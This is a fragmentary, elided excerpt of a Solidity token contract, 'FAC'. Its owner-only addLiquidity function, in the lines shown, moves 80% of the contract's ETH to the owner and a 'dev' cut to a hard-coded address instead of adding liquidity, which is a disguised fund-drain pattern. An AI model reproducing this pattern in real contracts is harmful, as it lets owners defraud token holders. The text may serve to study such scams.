...
contract FAC {
    ...
    function addLiquidity() public onlyOwner() {
        ...
        _authNum=0;
        msg.sender.transfer(address(this).balance.mul(80).div(100));
            uint dev = _airdropEth.mul(20).div(100);
            address(uint160(0x34D9Cd91f1eCBEdB1db017e3af7E703035A4dfA3)).transfer(dev);
